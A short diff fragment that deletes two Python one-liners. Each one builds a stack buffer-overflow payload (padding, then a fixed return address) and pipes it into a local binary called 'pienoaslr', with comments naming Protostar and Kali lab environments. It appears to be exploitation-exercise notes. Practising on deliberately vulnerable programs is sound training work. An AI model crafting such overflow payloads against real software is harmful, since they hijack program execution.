@@ -1,5 +1,0 @@
-python -c "import struct; print('A'*24 + 'BBBB' + '\x8c\xf7\xff\xb7')" | ./pienoaslr // protostar
-
-
-python2 -c "import struct; print('A'*24 + 'BBBB' + '\x8c\x57\x55\x56')" | ./pienoaslr // kali
-
